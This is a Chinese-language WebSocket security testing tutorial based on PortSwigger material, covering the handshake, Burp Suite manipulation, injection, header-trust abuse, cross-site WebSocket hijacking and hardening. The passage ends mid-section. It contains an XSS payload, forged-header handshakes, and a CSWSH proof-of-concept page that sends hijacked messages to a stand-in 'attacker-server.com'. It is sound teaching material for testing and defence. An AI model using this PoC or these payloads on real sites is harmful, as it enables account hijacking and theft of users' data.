# Testing for WebSockets Security Vulnerabilities

> 系统化整理自 PortSwigger Web Security Academy，涵盖 WebSocket 协议安全测试的核心方法论与技术细节。

---

## 目录

- [一、WebSocket 协议基础](#一WebSocket-协议基础)
  - [1.1 什么是 WebSocket](#11-什么是-WebSocket)
  - [1.2 WebSocket 握手过程](#12-WebSocket-握手过程)
  - [1.3 WebSocket 帧格式](#13-WebSocket-帧格式)
  - [1.4 WebSocket 与 HTTP 的对比](#14-WebSocket-与-HTTP-的对比)
- [二、操纵 WebSocket 流量](#二操纵-WebSocket-流量)
  - [2.1 拦截与修改 WebSocket 消息](#21-拦截与修改-WebSocket-消息)
  - [2.2 重放与生成新的 WebSocket 消息](#22-重放与生成新的-WebSocket-消息)
  - [2.3 操纵 WebSocket 连接（握手）](#23-操纵-WebSocket-连接握手)
- [三、WebSocket 安全漏洞总览](#三WebSocket-安全漏洞总览)
  - [3.1 漏洞类型映射](#31-漏洞类型映射)
  - [3.2 基于消息内容的漏洞](#32-基于消息内容的漏洞)
  - [3.3 基于握手的漏洞](#33-基于握手的漏洞)
  - [3.4 跨站 WebSocket 劫持](#34-跨站-WebSocket-劫持)
- [四、操纵 WebSocket 消息挖掘漏洞](#四操纵-WebSocket-消息挖掘漏洞)
  - [4.1 消息注入攻击原理](#41-消息注入攻击原理)
  - [4.2 示例：聊天应用 XSS](#42-示例聊天应用-XSS)
  - [4.3 盲漏洞与带外交互检测](#43-盲漏洞与带外交互检测)
- [五、操纵 WebSocket 握手挖掘漏洞](#五操纵-WebSocket-握手挖掘漏洞)
  - [5.1 握手阶段的安全缺陷](#51-握手阶段的安全缺陷)
  - [5.2 HTTP Header 信任滥用](#52-HTTP-Header-信任滥用)
  - [5.3 会话处理缺陷](#53-会话处理缺陷)
  - [5.4 自定义 HTTP Header 引入的攻击面](#54-自定义-HTTP-Header-引入的攻击面)
- [六、跨站 WebSocket 劫持（CSWSH）](#六跨站-WebSocket-劫持CSWSH)
  - [6.1 攻击原理](#61-攻击原理)
  - [6.2 与传统 CSRF 的区别](#62-与传统-CSRF-的区别)
  - [6.3 攻击影响](#63-攻击影响)
  - [6.4 攻击步骤](#64-攻击步骤)
  - [6.5 完整 PoC 示例](#65-完整-PoC-示例)
  - [6.6 检测方法](#66-检测方法)
- [七、WebSocket 安全加固指南](#七WebSocket-安全加固指南)
  - [7.1 协议层防护](#71-协议层防护)
  - [7.2 握手层防护](#72-握手层防护)
  - [7.3 数据层防护](#73-数据层防护)
  - [7.4 纵深防御总结](#74-纵深防御总结)

---

## 一、WebSocket 协议基础

### 1.1 什么是 WebSocket

WebSocket 是一种在单个 TCP 连接上进行全双工通信的网络协议。它通过 HTTP 发起连接建立（协议升级），之后维持长连接，允许服务端和客户端之间进行异步双向数据传输。

在现代 Web 应用中，WebSocket 被广泛用于：

- **实时通信**：聊天应用、在线客服、协作编辑
- **实时推送**：股票行情、赛事比分、通知系统
- **用户操作代理**：通过 WebSocket 传递用户指令并实时返回结果
- **敏感数据传输**：以 WebSocket 替代部分 AJAX 请求
- **双向数据同步**：在线游戏状态、物联网设备控制

**核心特征：**

- 通过一次 HTTP 握手完成协议升级（从 HTTP/HTTPS 升级为 WS/WSS）
- 握手完成后不再使用 HTTP 语义，而是在同一 TCP 连接上使用 WebSocket 帧协议
- 客户端和服务端可以在任意时间发送数据，无需等待对方请求
- 帧开销极小（最小仅 2 字节头部），适合高频小数据量的场景

### 1.2 WebSocket 握手过程

WebSocket 连接始于一个 HTTP Upgrade 请求。客户端发送一个标准的 HTTP 请求，携带特定的头信息以请求协议升级。

**客户端握手请求（Client Handshake Request）：**

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

| 头部字段 | 作用 | 安全相关性 |
|---------|------|-----------|
| `Upgrade: websocket` | 请求将连接从 HTTP 升级为 WebSocket | 无直接安全意义 |
| `Connection: Upgrade` | 配合 Upgrade 头使用 | 无直接安全意义 |
| `Sec-WebSocket-Version` | 指定 WebSocket 协议版本（通常为 13） | 不可用于身份验证 |
| `Sec-WebSocket-Key` | 客户端生成的随机 16 字节值，经 Base64 编码，用于证明握手意图 | 仅用于防缓存代理错误，**不用于身份验证或会话管理** |
| `Cookie` | 携带 HTTP 会话 Cookie | **这是握手阶段唯一的标准身份认证机制** |

**服务端握手响应（Server Handshake Response）：**

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
```

`Sec-WebSocket-Accept` 的值是通过以下算法计算的：

```
Base64(SHA1(Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
```

这个魔法字符串 `258EAFA5-E914-47DA-95CA-C5AB0DC85B11` 是 RFC 6455 规定的固定值，目的是确保服务端确实理解了 WebSocket 协议（而非意外响应了 Upgrade 请求的中间代理）。

**握手成功的关键判断标准：**

- HTTP 状态码必须是 `101 Switching Protocols`
- `Sec-WebSocket-Accept` 的值与计算预期一致

一旦握手完成，同一 TCP 连接就切换为 WebSocket 帧协议，后续通信不再使用 HTTP。

### 1.3 WebSocket 帧格式

WebSocket 帧的基本结构如下（简化版）：

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+-------------------------------+
|     Masking-key (0 or 4 bytes) |  Payload Data                |
+--------------------------------+                               +
:                     Payload Data continued ...                :
+---------------------------------------------------------------+
```

关键字段说明：

| 字段 | 说明 | 安全相关性 |
|------|------|-----------|
| FIN | 是否为消息的最后一帧（1 bit） | 无直接意义 |
| opcode | 帧类型：文本帧(1)、二进制帧(2)、关闭帧(8)、Ping(9)、Pong(10) | 文本帧可以包含任意数据，是注入攻击的主要载体 |
| MASK | 客户端→服务端消息必须掩码（置 1），服务端→客户端不可掩码（置 0） | RFC 6455 规定，防止缓存投毒攻击 |
| Payload len | 负载长度 | 无直接意义 |
| Masking-key | 4 字节掩码密钥（仅客户端→服务端） | 由客户端随机生成，非安全特性 |
| Payload Data | 实际传输的数据 | **安全测试的核心目标区域** |

**掩码机制（Masking）：**

客户端发送的每条消息均使用 4 字节随机掩码密钥进行异或（XOR）处理：

```
masked_byte[i] = payload_data[i] XOR masking_key[i % 4]
```

掩码不是加密机制，而是为了防止中间代理缓存投毒攻击（利用恶意 WebSocket 数据操控代理服务器的缓存行为）。从安全测试角度看，Burp Suite 会自动处理掩码的施加和解除，测试者无需手动计算。

### 1.4 WebSocket 与 HTTP 的对比

| 维度 | HTTP | WebSocket |
|------|------|-----------|
| 通信模式 | 请求-响应（半双工） | 全双工 |
| 连接生命周期 | 短连接（或 Keep-Alive 复用） | 长连接 |
| 协议开销 | 每次请求完整的 HTTP 头 | 每帧最小 2 字节 |
| 服务端推送 | 需要轮询或 SSE | 原生支持 |
| 同源策略限制 | 严格受限于同源策略 | WebSocket 握手不受同源策略严格限制 |
| 身份认证 | 每次请求携带 Cookie/Token | 仅在握手时进行，连接建立后不再验证 |
| 状态管理 | 无状态（应用层自行处理） | 有状态连接 |

**安全视角的关键差异：**

1. WebSocket 的握手不受浏览器的同源策略严格限制 -- 任意源可以发起 WebSocket 握手请求到目标服务器。这是跨站 WebSocket 劫持的首要前提。
2. 身份验证只在握手阶段进行一次，连接建立后的所有消息不再经过独立的认证检查 -- 这意味着如果握手防御不足，整个长连接都将被劫持。
3. WebSocket 不强制要求 CSRF token -- 完全依赖开发者自行实现握手保护。

---

## 二、操纵 WebSocket 流量

### 2.1 拦截与修改 WebSocket 消息

使用 Burp Proxy 拦截和修改 WebSocket 消息的流程：

1. 打开 Burp 内置浏览器。
2. 浏览到使用 WebSocket 的应用功能页面。可以通过观察 Burp Proxy 的 **WebSockets history** 选项卡（位于 Proxy 面板中）中出现的条目来确认 WebSocket 正在被使用。
3. 在 Burp Proxy 的 **Intercept** 选项卡中，确认拦截功能已开启。
4. 当浏览器或服务器发送 WebSocket 消息时，消息会显示在 Intercept 选项卡中进行查看或修改。
5. 按下 **Forward** 按钮转发消息。

**配置拦截规则：**

在 Burp 的 Settings 对话框中，**WebSocket interception rules** 设置允许你指定拦截客户端→服务端的消息、服务端→客户端的消息，或两者都拦截。根据测试目标灵活调整：

- 测试输入点：拦截客户端→服务端消息，修改 payload 后转发
- 测试响应处理：拦截服务端→客户端消息，观察应用中如何处理这些数据

### 2.2 重放与生成新的 WebSocket 消息

除了实时拦截修改，还可以重放已有消息或生成新消息。通过 Burp Repeater 完成：

**操作步骤：**

1. 在 Burp Proxy 中，从 **WebSockets history** 或 **Intercept** 选项卡选择一个 WebSocket 消息，右键选择 **"Send to Repeater"**。
2. 在 Burp Repeater 中，你可以编辑已选的消息并反复发送。
3. 你可以构造一条新消息，并以任意方向发送 -- 发送给客户端或发送给服务器。
4. 在 Burp Repeater 的 **"History"** 面板中，可以查看该 WebSocket 连接上已传输的所有消息历史。这包括：
   - 你在 Burp Repeater 中生成并发送的消息
   - 浏览器或服务器通过同一连接生成的消息
5. 如需编辑并重发 history 面板中的任意消息，选中该消息后右键选择 **"Edit and resend"**。

**实用技巧：**

- 使用 Repeater 可以隔离变量，逐个测试不同 payload 对同一消息的影响
- History 面板可以帮你对比正常消息与被篡改消息的响应差异
- 支持在同一连接上连续发送多条消息进行状态探索

### 2.3 操纵 WebSocket 连接（握手）

在某些情况下，仅操纵 WebSocket 消息是不够的，还需要操纵建立连接的 WebSocket 握手。可能需要操纵握手的典型场景：

- **扩大攻击面**：修改握手请求中的 HTTP Header（如 Origin、User-Agent、X-Forwarded-For、自定义头部）以触发不同的服务端处理路径。
- **连接重建**：某些攻击（如恶意 payload 导致服务器主动关闭连接）会使连接断开，需要重新建立连接以继续测试。
- **Token 过期刷新**：原始握手请求中的 token 或 session 可能已过期，需要更新。

**使用 Burp Repeater 操纵握手：**

1. 按前述方法将 WebSocket 消息发送到 Burp Repeater。
2. 在 Burp Repeater 中，点击 WebSocket URL 旁边的铅笔图标。这会打开一个向导对话框。
3. 向导提供以下选项：
   - **Attach to an existing connected WebSocket** -- 附加到已有的已连接 WebSocket
   - **Clone a connected WebSocket** -- 克隆一个已连接的 WebSocket（复用握手参数创建新连接）
   - **Reconnect to a disconnected WebSocket** -- 重新连接到一个断开的 WebSocket
4. 如果选择 **克隆已连接的 WebSocket** 或 **重新连接到断开的 WebSocket**，向导会显示 WebSocket 握手请求的完整详情。此时可以编辑握手请求的任意部分（Header、参数等），编辑完成后执行握手。
5. 点击 **"Connect"** 后，Burp 将尝试执行配置好的握手并显示结果。如果新的 WebSocket 连接建立成功，即可在 Burp Repeater 中使用此连接发送新消息。

**握手操纵的测试要点：**

- 修改 `Origin` 头观察服务端是否验证源
- 修改 `Cookie` 头测试会话绑定机制
- 添加/修改 `X-Forwarded-For`、`X-Real-IP` 等头测试 IP 信任滥用
- 添加自定义头观察是否触发不同的处理逻辑

---

## 三、WebSocket 安全漏洞总览

### 3.1 漏洞类型映射

几乎任何在常规 HTTP 通信中存在 Web 安全漏洞，也可能出现在 WebSocket 通信中。WebSocket 不引入全新的漏洞类别，而是为已知漏洞类型提供了**新的传输载体和攻击面**。

| 漏洞类型 | 在 WebSocket 中的表现形式 | 检测难度 |
|---------|-------------------------|---------|
| SQL 注入 | 服务端将 WebSocket 消息中的用户输入拼接到 SQL 查询 | 与 HTTP 相同，但流量不可见 |
| XXE（XML 外部实体注入） | 服务端以 XML 解析 WebSocket 消息内容 | 中等（需构造 XML payload） |
| XSS（跨站脚本） | 服务端将 WebSocket 消息广播给其他用户并在浏览器中渲染 | 低（直接可见） |
| SSRF（服务端请求伪造） | 服务端根据 WebSocket 消息内容发起请求 | 中等（需带外交互） |
| 命令注入 | WebSocket 消息内容被拼接到系统命令中 | 中等（需带外交互） |
| IDOR（不安全直接对象引用） | 通过修改 WebSocket 消息中的资源标识符访问未授权数据 | 低-中等 |
| 业务逻辑缺陷 | 通过 WebSocket 消息触发非预期的业务状态转换 | 高（需理解业务） |
| CSRF/CSWSH | 跨站伪造 WebSocket 握手请求 | 中等（需专门测试） |

### 3.2 基于消息内容的漏洞

这类漏洞通过篡改 WebSocket 消息的**内容**来挖掘，是最常见的 WebSocket 安全测试入口。

**触发条件：** 服务端或客户端对 WebSocket 消息中的数据进行不安全处理（拼接 SQL、拼接到 DOM、传递给危险函数等）。

**测试方法：** 使用 Burp Repeater 修改消息内容，观察响应或应用行为。

### 3.3 基于握手的漏洞

某些 WebSocket 漏洞只能通过操纵 WebSocket 握手来发现和利用。这类漏洞通常涉及设计层面的缺陷。

**典型场景：**

1. **HTTP Header 信任滥用** -- 服务端信任 `X-Forwarded-For` 等头来决定安全策略
2. **会话处理缺陷** -- WebSocket 消息处理的会话上下文由握手时的会话状态决定，存在会话固定或会话混淆的可能
3. **自定义 HTTP Header 引入的攻击面** -- 应用在握手阶段使用自定义 Header 传递控制参数

### 3.4 跨站 WebSocket 劫持

跨站 WebSocket 劫持（Cross-Site WebSocket Hijacking, CSWSH）本质上是 WebSocket 握手阶段的 CSRF 漏洞。当 WebSocket 握手仅仅依赖 HTTP Cookie 进行身份验证，且不包含 CSRF Token 或其他不可预测的校验值时，攻击者可以从恶意网站发起跨站 WebSocket 连接，以受害者身份与应用交互。

**与传统 CSRF 的关键区别：** CSWSH 给攻击者带来了**双向交互**能力 -- 攻击者不仅可以在受害者身份下发送消息，还能读取服务器返回的消息内容。这使得数据窃取成为可能。

详见 [第六节](#六跨站-WebSocket-劫持CSWSH)。

---

## 四、操纵 WebSocket 消息挖掘漏洞

### 4.1 消息注入攻击原理

WebSocket 消息的负载（payload）在应用中的流转路径通常为：

```
客户端 → WebSocket 消息 → 服务端处理 → 数据库 / 其他客户端 / 外部系统
```

在这个数据流中，任何处理环节如果对消息内容进行了不安全操作，都可能产生安全漏洞。

**核心测试思想：** 将一个看似处理 HTTP 请求的注入点替换为 WebSocket 消息中的字段，本质上是一样的测试方法论 -- 找到输入点，注入恶意 payload，观察输出。

**消息格式考量：**

WebSocket 消息没有强制的格式规范（不像 HTTP 请求有固定的方法、路径、头），因此消息格式完全由应用自行定义。常见格式包括：

- **JSON**：`{"type": "message", "content": "hello", "to": "user123"}`
- **纯文本**：`hello world`
- **二进制/自定义序列化**：Protocol Buffers、MsgPack 等
- **XML**：`<message><content>hello</content></message>`

在进行安全测试前，首先要**理解消息格式**和**字段语义**：哪些字段会进入数据库查询？哪些字段会回显给其他用户？哪些字段用于服务端路由或权限判断？

### 4.2 示例：聊天应用 XSS

以下是一个典型的 WebSocket XSS 场景：

**场景设定：** 一个聊天应用使用 WebSocket 在浏览器和服务器之间传输聊天消息。当用户输入聊天内容时，浏览器发送如下 JSON 消息到服务器：

```json
{"message":"Hello Carlos"}
```

服务器将消息内容（通过 WebSocket）转发给另一个聊天用户，并在用户的浏览器中渲染：

```html
<td>Hello Carlos</td>
```

**漏洞分析：**

消息内容 `Hello Carlos` 被直接嵌入 HTML 中。如果服务端不做任何输入处理或输出编码，攻击者可以提交包含 HTML/JavaScript 的 WebSocket 消息：

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

这条消息被服务端转发给其他用户后，将在受害者的浏览器中渲染为：

```html
<td><img src=1 onerror='alert(1)'></td>
```

`<img>` 标签尝试加载不存在的图片 `src=1`（加载失败），触发 `onerror` 事件处理器，执行 `alert(1)`。

**测试步骤：**

1. 在 Burp Proxy 的 WebSockets history 中找到发送聊天消息的 WebSocket 帧
2. 将消息发送到 Burp Repeater
3. 修改消息的 `message` 字段为 XSS payload
4. 发送消息，在目标浏览器中观察是否有弹窗

**此漏洞的核心原因：** 服务端将 WebSocket 消息中的用户输入——在未经验证和编码的情况下——直接写入了其他用户的 DOM 上下文中。这与传统 HTTP Reflected XSS 的成因完全一致，只是输入载体从 URL 参数/表单变成了 WebSocket 帧。

### 4.3 盲漏洞与带外交互检测

与 HTTP 盲漏洞一样，通过 WebSocket 触发的某些漏洞在响应中不可见（例如盲 SQL 注入、盲命令注入、盲 SSRF），需要使用带外交互（Out-of-Band Application Security Testing, OAST）技术来检测。

**工作流程：**

1. 在 WebSocket 消息中注入 OAST payload（如指向 Burp Collaborator 的 URL 或 DNS 查询）
2. 如果服务端对该字段进行了不安全处理（例如将其传递给 `curl` 命令或 `nslookup`），它会向 Collaborator 服务器发起交互
3. 在 Burp Collaborator 客户端中观察是否有来自目标服务器的 DNS/HTTP 交互

**示例 -- 探测通过 WebSocket 的盲 SSRF：**

原始 WebSocket 消息：
```json
{"action": "fetch_preview", "url": "https://legitimate-site.com/page"}
```

修改后的测试消息：
```json
{"action": "fetch_preview", "url": "https://YOUR-SUBDOMAIN.burpcollaborator.net"}
```

如果 Collaborator 收到了来自目标服务器的交互，说明存在 SSRF 漏洞。

---

## 五、操纵 WebSocket 握手挖掘漏洞

### 5.1 握手阶段的安全缺陷

WebSocket 握手本质是一个 HTTP 请求，因此所有适用于 HTTP 请求的安全测试方法同样适用于 WebSocket 握手。关键区别在于：WebSocket 握手的结果不仅仅影响这一个请求-响应周期，而是决定了整个持久连接的安全上下文。

**为什么握手阶段可能产生漏洞：**

1. 握手时的 HTTP Header 被用于安全决策（IP 白名单、权限判断、路由选择）
2. 握手时的会话状态决定了后续所有消息的处理上下文
3. 握手请求可能包含自定义 Header 来传递控制参数

### 5.2 HTTP Header 信任滥用

当服务端信任 HTTP 请求头（尤其是可以被客户端或代理篡改的头）来做安全决策时，WebSocket 握手就成为一个可利用的攻击面。

**经典案例 -- X-Forwarded-For 信任滥用：**

假设应用基于 `X-Forwarded-For` 头来识别用户真实 IP，并对内网 IP 免除某些安全检查。如果 WebSocket 握手也使用同样的逻辑：

```http
GET /ws/admin HTTP/1.1
Host: vulnerable-app.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Cookie: session=abc123
X-Forwarded-For: 127.0.0.1
```

如果服务端信任了伪造的 `X-Forwarded-For: 127.0.0.1`，攻击者可能绕过 IP 级别的访问控制，建立特权 WebSocket 连接。

**其他可被滥用的 HTTP Header：**

| Header | 潜在滥用 |
|--------|---------|
| `X-Forwarded-For` / `X-Real-IP` | IP 欺骗以绕过访问控制 |
| `Origin` / `Referer` | 源验证绕过（如果服务端不严格校验） |
| `User-Agent` | 触发不同的服务端处理逻辑 |
| `Host` | Host Header 攻击，影响路由或绝对 URL 生成 |
| 自定义 Header（如 `X-Admin: true`） | 权限提升（如果服务端信任此类 Header） |

**测试方法：**

1. 在 Burp Repeater 中克隆现有 WebSocket 连接
2. 在握手请求中添加或修改 HTTP Header
3. 执行握手并观察是否返回 `101 Switching Protocols`
4. 如果成功建立连接，通过发送消息验证权限差异

### 5.3 会话处理缺陷

WebSocket 消息处理的会话上下文通常由握手时的 HTTP 会话状态决定。这带来几个安全隐患：

**会话固定（Session Fixation）：**

如果应用在接受 WebSocket 握手时不重新验证会话的有效性，攻击者可能利用一个已知的会话 ID 建立 WebSocket 连接，然后在受害者登录后利用同一 WebSocket 连接获取受害者的数据。

**会话上下文混淆：**

WebSocket 连接建立后，会话状态的变化（如权限升级、登出）通常不会自动反映到已建立的 WebSocket 连接上。如果应用没有在会话状态变更时主动关闭相关的 WebSocket 连接，就会出现连接权限与实际会话不一致的情况。

**NoSQL 注入与其他注入：**

有些应用将 WebSocket 消息与数据库查询结合使用，容易受到注入攻击。例如，如果 WebSocket 消息中的字段被用于 MongoDB 查询，且服务端使用拼接而非参数化查询，则可能发生 NoSQL 注入。

### 5.4 自定义 HTTP Header 引入的攻击面

某些应用在 WebSocket 握手时使用自定义 HTTP Header 传递额外的控制参数：

```http
GET /ws/chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Cookie: session=abc123
X-User-Role: user
X-Auth-Token: eyJhbGciOiJIUzI1NiIs...
```

如果服务端信任这些自定义 Header 的值，攻击者可以通过修改它们来：

- 伪造用户角色/权限（`X-User-Role: admin`）
- 绕过 Token 校验（如果服务端未正确验证 Token 签名或有效性）
- 修改路由行为（影响 WebSocket endpoint 的路径分发）

**测试方法：**

1. 枚举握手请求中的所有自定义 Header（尤其是 `X-` 前缀的）
2. 逐个修改值，观察握手是否成功以及后续通信是否有差异
3. 尝试删除某些 Header（如果服务端对缺失 Header 的处理不同于错误值）

---

## 六、跨站 WebSocket 劫持（CSWSH）

### 6.1 攻击原理

跨站 WebSocket 劫持（Cross-Site WebSocket Hijacking, CSWSH）是 WebSocket 握手阶段的跨站请求伪造（CSRF）漏洞。

**核心成因：** WebSocket 握手请求仅依赖 HTTP Cookie 进行会话管理，且未包含 CSRF Token 或其他不可预测的校验值。

**攻击者能做什么：**

攻击者在自己的域名上创建一个恶意 Web 页面，该页面通过 JavaScript 向存在漏洞的应用发起跨站 WebSocket 连接。由于浏览器会自动附上目标域名的 Cookie，应用会在受害者用户的会话上下文中处理该连接。攻击者随后可以：

1. 通过该连接发送任意消息（以受害者的身份执行操作）
2. 读取服务器返回的消息（窃取受害者可访问的敏感数据）

**浏览器行为基础：**

WebSocket 的握手不受浏览器的同源策略严格限制。任意源的网页都可以执行 `new WebSocket("wss://target.com/endpoint")` 来发起跨站 WebSocket 连接。浏览器会自动携带目标域的 Cookie（如果 Cookie 的 `SameSite` 属性允许）。

这意味着 WebSocket 的安全完全依赖于**服务端对握手请求的额外验证**（不依赖浏览器拦截），而非浏览器同源策略。

### 6.2 与传统 CSRF 的区别

| 维度 | 传统 CSRF | 跨站 WebSocket 劫持 (CSWSH) |
|------|----------|---------------------------|
| 交互方向 | 单向（攻击者发送请求，只能看到 HTTP 响应头和有限的响应信息） | **双向**（攻击者可以发送消息并读取所有返回消息） |
| 协议 | HTTP（请求-响应） | WebSocket（全双工持久连接） |
| 数据窃取 | 通常不能（受同源策略限制，无法读取跨域响应） | **可以**（WebSocket API 允许读取消息事件数据） |
| 持续控制 | 一次性请求 | 持久连接，可以持续交互 |
| 攻击面的本质 | 伪造 HTTP 请求 | 伪造 WebSocket 握手 + 建立受控的双向通信信道 |

**CSWSH 为什么比传统 CSRF 更危险：**

传统 CSRF 攻击是"盲"的 -- 攻击者可以触发操作，但无法读取响应内容（除非存在 CORS 配置缺陷）。相比之下，CSWSH 的 WebSocket API 通过 `onmessage` 事件处理程序允许攻击者直接读取服务器通过 WebSocket 推送的任意数据。

这意味着 CSWSH 不仅可用于**状态变更攻击**（如 CSRF 的传统用途：修改密码、转账），还可用于**数据窃取**（读取聊天记录、获取敏感 API 响应）。

### 6.3 攻击影响

成功实施跨站 WebSocket 劫持后，攻击者通常可以：

**1. 伪装受害者执行未授权操作：**

与常规 CSRF 类似，攻击者可以发送任意 WebSocket 消息到服务端。如果应用使用客户端生成的 WebSocket 消息来触发敏感操作（如转账、删除数据、修改设置），攻击者即可跨域生成这些消息并触发对应操作。

**2. 窃取受害者可访问的敏感数据：**

与常规 CSRF 不同，CSWSH 给攻击者提供了与被劫持 WebSocket 的双向交互能力。如果应用通过服务端推送的 WebSocket 消息返回敏感数据（如聊天内容、实时通知、API 响应），攻击者可以拦截这些消息并捕获受害者的数据。

**3. 维持对受害者会话的持续控制：**

由于 WebSocket 是持久连接，攻击者可以在较长的时间窗口内持续监控和操控受害者会话，而非仅限于一次性的请求伪造。

### 6.4 攻击步骤

**Step 1: 检测握手端点是否存在 CSRF 保护**

审查应用的 WebSocket 握手请求，确认是否满足 CSRF 的触发条件：

- 握手仅依赖 HTTP Cookie 进行身份验证（无额外的 Token 或不可预测参数）
- 握手请求中没有 CSRF Token（如 `csrf_token` 参数或 `X-CSRF-Token` 头）
- `Sec-WebSocket-Key` 仅用于协议握手，**不是**安全验证机制

**典型的易受攻击的握手请求：**

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

**检验方法：** 检查握手请求中是否存在以下保护措施：

- URL 参数中是否包含随机 Token（如 `?csrf=...`）
- 是否有 `X-CSRF-Token` 或其他自定义安全 Header
- 服务端是否校验 `Origin` 头
- Service Worker 或其他中间层是否添加了额外的验证

如果以上均不存在，握手请求很可能存在 CSRF 漏洞。

**Step 2: 确定攻击目标**

分析应用如何使用 WebSocket，确定攻击可以达到的目标：

- **数据窃取路径**：哪些 WebSocket 消息包含敏感数据（服务端→客户端方向）
- **操作触发路径**：哪些 WebSocket 消息可以触发敏感操作（客户端→服务端方向）
- **被动监听路径**：是否仅靠建立连接并等待就能收到敏感数据

**Step 3: 构造恶意页面**

创建一个托管在攻击者控制的域名的网页，其中包含恶意的 JavaScript 代码。

### 6.5 完整 PoC 示例

```html
<!DOCTYPE html>
<html>
<head>
    <title>Cross-Site WebSocket Hijacking PoC</title>
</head>
<body>
    <h1>Clickjacking Test Page - CSWSH PoC</h1>
    <div id="output"></div>

    <script>
        // 建立跨站 WebSocket 连接到目标应用
        var ws = new WebSocket('wss://vulnerable-website.com/chat');

        // 连接成功建立后（以受害者身份），发送恶意消息
        ws.onopen = function() {
            // 以受害者身份发送聊天消息（操作伪造）
            ws.send(JSON.stringify({
                action: 'send_message',
                to: 'admin',
                content: 'I have been hacked!'
            }));

            // 或者发送读取数据的请求
            ws.send(JSON.stringify({
                action: 'fetch_chat_history',
                with_user: 'admin'
            }));
        };

        // 接收并捕获服务器返回的敏感数据（数据窃取）
        ws.onmessage = function(event) {
            var output = document.getElementById('output');
            output.innerHTML += '<p>Received: ' + event.data + '</p>';

            // 在实际攻击中，数据会被发送到攻击者的服务器
            fetch('https://attacker-server.com/collect?data=' + encodeURIComponent(event.data));
        };

        // 连接错误日志
        ws.onerror = function(error) {
            console.error('WebSocket error:', error);
        };
    </script>
</body>
</html>
```

**此 PoC 的工作流程：**

1. 受害者访问 `https://attacker-server.com/cswsh-poc.html`（攻击者控制的页面）
2. 页面中的 JavaScript 执行 `new WebSocket('wss://vulnerable-website.com/chat')`
3. 浏览器自动向 `vulnerable-website.com` 发送握手请求，并携带该域的 Cookie
4. 服务端仅通过 Cookie 验证身份，将 WebSocket 连接与受害者会话关联
5. 连接建立后，`ws.onopen` 触发，攻击者以受害者身份发送消息（操作伪造）
6. 服务器推送的消息通过 `ws.onmessage` 被攻击者捕获（数据窃取）

### 6.6 检测方法

**手动检测：**

1. 记录一个正常的 WebSocket 握手请求（使用 Burp Proxy）
2. 将请求复制到 Burp Repeater，去除所有可能的安全 Header（如 `Origin`、`Referer`）
3. 重新发送握手请求，观察服务端是否仍然返回 `101 Switching Protocols`
4. 如果成功建立连接，说明服务端可能未验证请求来源

**自动化检测线索：**

- 握手指向的 URL 中没有随机 Token 参数
- `Cookie` 是唯一明显的身份验证载体
- 服务端对不同的 `Origin` 头没有差异化响应

**与 SameSite Cookie 属性的交互：**

从 Chrome 80+ 开始，Cookie 默认 `SameSite=Lax`。`SameSite=Lax` 会阻止跨站场景下的 WebSocket 握手（因为 WebSocket 握手被视为"顶级导航"请求之外的请求类型）。

这意味着：

- 如果目标 Cookie 设置了 `SameSite=Strict`：CSWSH 完全不可行
- 如果目标 Cookie 设置了 `SameSite=Lax`（或默认）：取决于浏览器，Chrome 默认阻止
- 如果目标 Cookie 设置了 `SameSite=None`：CSWSH 完全可行
- 如果目标 Cookie 没有设置 `SameSite` 属性：老浏览器中可能可行，新浏览器中默认 `Lax`

---

## 七、WebSocket 安全加固指南

### 7.1 协议层防护

**1. 使用 `wss://` 协议 (WebSocket over TLS)**

始终使用加密的 WebSocket 连接（`wss://`），防止中间人攻击和流量嗅探。这与 HTTP 中使用 `https://` 的原因完全相同。

```
正确：wss://example.com/chat
错误：ws://example.com/chat
```

**原理：** TLS 层提供三个核心安全保证：
- 加密：防止流量被窃听
- 完整性：防止消息被篡改
- 身份验证：确认通信对象是预期的服务器

### 7.2 握手层防护

**2. 硬编码 WebSocket 端点 URL**

不要将用户可控的数据拼接到 WebSocket URL 中。在客户端代码中硬编码 WebSocket 的目标地址，或从服务端可信配置中获取。

```javascript
// 错误：URL 包含用户可控的数据
var ws = new WebSocket('wss://' + location.hash.slice(1));

// 正确：硬编码 URL
var ws = new WebSocket('wss://example.com/chat');
```

**风险：** 如果 URL 来自不受信来源，攻击者可以将 WebSocket 连接重定向到恶意服务器（WebSocket URL 投毒）。

**3. 保护 WebSocket 握手免受 CSRF 攻击**

这是防御 CSWSH 的核心措施。可选方案包括：

**方案 A -- CSRF Token：**

在握手请求中引入 CSRF Token（URL 参数或自定义 Header），服务端在建立连接前校验 Token。

```http
GET /chat?csrf_token=RANDOM_UNPREDICTABLE_VALUE HTTP/1.1
```

```javascript
// 客户端动态获取 Token 后发起连接
var token = getCsrfToken();
var ws = new WebSocket('wss://example.com/chat?csrf_token=' + token);
```

**方案 B -- Origin Header 校验：**

服务端验证握手请求中的 `Origin` 头，仅允许来自白名单域名的请求建立连接。

```
if (request.headers['Origin'] !== 'https://trusted-domain.com') {
    // 拒绝连接
}
```

**注意事项：**
